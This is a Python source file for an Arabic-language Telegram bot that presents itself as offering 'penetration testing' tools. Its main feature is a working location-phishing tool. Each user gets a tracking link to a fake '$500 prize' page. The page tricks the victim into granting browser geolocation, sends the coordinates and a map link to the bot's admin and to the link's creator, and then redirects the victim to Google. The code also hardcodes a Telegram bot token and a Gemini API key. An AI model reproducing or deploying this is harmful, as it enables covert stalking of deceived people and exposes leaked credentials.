import telebot
import os
import threading
import json
from telebot import types
from google import genai
from flask import Flask, request, render_template_string

# ==========================================
#           إعدادات البوت
# ==========================================

TOKEN = "8711639465:AAGHtPQ1J4ft1mDzNkhvfYy7bDZNUlNYcGQ"
bot = telebot.TeleBot(TOKEN)

GEMINI_API_KEY = "AQ.Ab8RN6J4M0ISba5SUQnAgL9szzAHx6Hn0Qvrbseu89yHnuBXUw"
ai_client = genai.Client(api_key=GEMINI_API_KEY)

ADMIN_ID = 1036157698

# رابط خادم البوت على الاستضافة (قم بتغييره بعد الرفع على Render أو فك الحظر)
# هذا الرابط هو الذي سيُبنى عليه رابط التحديد التلقائي
BOT_DOMAIN = "https://root7-bot.onrender.com" 

# ==========================================
#           حفظ المستخدمين
# ==========================================
USERS_FILE = "users.json"

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return []
    return []

def save_users(users):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, ensure_ascii=False, indent=4)

PERMANENT_USERS = load_users()

# ==========================================
#      صفحة الوهمية والـ Webhook (Flask)
# ==========================================
app = Flask(__name__)

# صفحة اختراق الواجهة (هندسة اجتماعية مدمجة تطلب الموقع)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ مسابقة شوتايم الرسمية ⚡</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f9; padding: 50px; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; }
        button { background: #25d366; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2>تهانينا! لقد تم ترشيحك للفوز بجائزة مالية الكبرى بقيمة 500$ 🎁</h2>
        <p>للتحقق من هويتك واستلام الجائزة فوراً في منطقتك، يرجى الضغط على الزر أدناه لتأكيد موقعك الحالي:</p>
        <button onclick="getLocation()">اضغط هنا لتأكيد الهوية واستلام الجائزة</button>
    </div>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition, showError);
            } else {
                alert("المتصفح لا يدعم تحديد الموقع.");
            }
        }

        function sendPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get('user_id');

            // إرسال البيانات فوراً إلى سيرفر البوت في الخلفية
            fetch('/webhook/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `lat=${lat}&lon=${lon}&user_id=${userId}`
            }).then(res => {
                window.location.href = "https://www.google.com"; // تحويل الضحية لجوجل بعد السحب
            });
        }

        function showError(error) {
            alert("يجب السماح بالصلاحية للتحقق من هويتك واستلام الجائزة.");
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return "ROOT-7 Bot is running! 🚀"

# مسار فتح الرابط بواسطة الضحية
@app.route('/track')
def track_page():
    return render_template_string(HTML_TEMPLATE)

# استقبال البيانات من الصفحة وإرسالها للمطور والمستخدم
@app.route('/webhook/location', methods=['POST'])
def receive_location():
    try:
        lat = request.form.get('lat')
        lon = request.form.get('lon')
        user_id = request.form.get('user_id')

        if lat and lon:
            alert_msg = (
                f"📍 **تم صيد موقع جديد بنجاح!**\n\n"
                f"📐 خط العرض: `{lat}`\n"
                f"📐 خط الطول: `{lon}`\n\n"
                f"🔗 **رابط الخريطة مباشرة:**\n"
                f"https://maps.google.com/?q={lat},{lon}"
            )
            
            # 1. إرسال الإشعار لك أنت كـ مطور (ADMIN)
            bot.send_message(ADMIN_ID, f"🔔 [إشعار المطور الرئيسي]\n{alert_msg}", parse_mode="Markdown")
            
            # 2. إرسال الإشعار للمستخدم الذي قام بتوليد الرابط (إذا لم يكن المطور نفسه)
            if user_id and int(user_id) != ADMIN_ID:
                try:
                    bot.send_message(int(user_id), f"🔥 أداة الصيد الخاصة بك:\n{alert_msg}", parse_mode="Markdown")
                except Exception as e:
                    print(f"Could not send message to user {user_id}: {e}")
                    
            return "Success", 200
        return "Missing parameters", 400
    except Exception as e:
        print(f"Error in webhook: {e}")
        return "Internal Error", 500

def run_flask():
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# ==========================================
#            قوائم الأزرار (Keyboards)
# ==========================================
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton('🤖 الذكاء الاصطناعي'), types.KeyboardButton('🛡️ الأمن السيبراني'))
    markup.add(types.KeyboardButton('🛠️ صنع بوتات تلجرام'), types.KeyboardButton('💁‍♂️ مطورو البوت'))
    return markup

def cyber_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton('🔥 الاختراق'), types.KeyboardButton('⬅️ العودة للقائمة الرئيسية'))
    return markup

def hacking_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton('📍 تحديد الموقع'), types.KeyboardButton('⬅️ العودة لقسم الأمن السيبراني'))
    return markup

# ==========================================
#              Handlers
# ==========================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name or "بدون اسم"
    username = f"@{message.from_user.username}" if message.from_user.username else "@لا يوجد يوزر"

    is_exists = any(user["id"] == user_id for user in PERMANENT_USERS)
    if not is_exists:
        new_user = {"id": user_id, "name": first_name, "username": username}
        PERMANENT_USERS.append(new_user)
        save_users(PERMANENT_USERS)
        
        bot.send_message(ADMIN_ID, f"🔔 مستخدم جديد دخل البوت!\n👤 الاسم: {first_name}\n🆔 الآيدي: {user_id}")

    text = f"أهلاً بك يا {first_name} 🙋‍♂️\nمرحباً بك في فريق ROOT—7\n\nاختر من القائمة أدناه:"
    bot.send_message(message.chat.id, text, reply_markup=main_menu())

@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    user_id = message.from_user.id

    if message.text == '🛡️ الأمن السيبراني' or message.text == '⬅️ العودة لقسم الأمن السيبراني':
        bot.send_message(message.chat.id, "🛡️ قسم الأمن السيبراني، اختر التخصص الفرعي:", reply_markup=cyber_menu())
    
    elif message.text == '🔥 الاختراق':
        bot.send_message(message.chat.id, "🔥 أدوات اختبار الاختراق المتاحة:", reply_markup=hacking_menu())
    
    elif message.text == '📍 تحديد الموقع':
        # توليد الرابط المخصص والمستقر تلقائياً لهذا المستخدم بالذات
        user_specific_link = f"{BOT_DOMAIN}/track?user_id={user_id}"
        
        info_text = (
            "📍 **أداة تحديد الموقع الجغرافي العكسي (الدائمة)**\n\n"
            "إليك الرابط الخاص بك الجاهز للعمل 24 ساعة بدون انقطاع.\n"
            "قم بنسخه وإرساله للضحية، وعند موافقته ستصلك الإحداثيات هنا فوراً!\n\n"
            f"🔗 **الرابط الخاص بك:**\n`{user_specific_link}`"
        )
        bot.send_message(message.chat.id, info_text, parse_mode="Markdown")

    elif message.text == '⬅️ العودة للقائمة الرئيسية':
        bot.send_message(message.chat.id, "🏠 تم الرجوع للقائمة الرئيسية", reply_markup=main_menu())
    
    elif message.text == '🛠️ صنع بوتات تلجرام':
        bot.send_message(message.chat.id, "🛠️ قسم صناعة البوتات قيد التطوير...")
    
    elif message.text == '💁‍♂️ مطورو البوت':
        bot.send_message(message.chat.id, "👨‍💻 فريق ROOT—7")

# ==========================================
#           تشغيل البوت
# ==========================================
def start_bot():
    try:
        bot.delete_webhook(drop_pending_updates=True)
    except Exception as e:
        print(e)
    bot.infinity_polling()

if __name__ == "__main__":
    t = threading.Thread(target=start_bot)
    t.start()
    run_flask()
